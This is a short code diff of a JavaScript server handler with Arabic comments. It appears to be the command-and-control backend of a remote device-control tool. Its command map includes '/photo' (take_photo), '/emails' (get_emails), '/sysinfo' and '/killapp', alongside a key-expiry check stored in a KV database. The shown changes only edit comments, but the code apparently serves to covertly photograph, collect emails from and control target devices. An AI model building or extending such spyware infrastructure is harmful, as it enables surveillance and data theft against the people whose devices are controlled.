@@ -33,7 +33,7 @@ const BASE_COMMANDS = {
   '/killapp': 'killapp:1',
   '/sysinfo': 'sysinfo:1',
   '/photo': 'take_photo',
-  '/emails': 'get_emails:1' // <--- الأمر الجديد
+  '/emails': 'get_emails:1'
 };
 
 async function kvCmd(...args) {
@@ -92,6 +92,7 @@ export default async function handler(req, res) {
     }
 
     if (type === 'command') {
+      // التحقق من وقت انتهاء المفتاح (gentime) المحفوظ في KV
       const expAt = await kvCmd('GET', 'key_exp_at');
       if (expAt && Date.now() > parseInt(expAt)) {
         await kvCmd('DEL', 'key_exp_at');
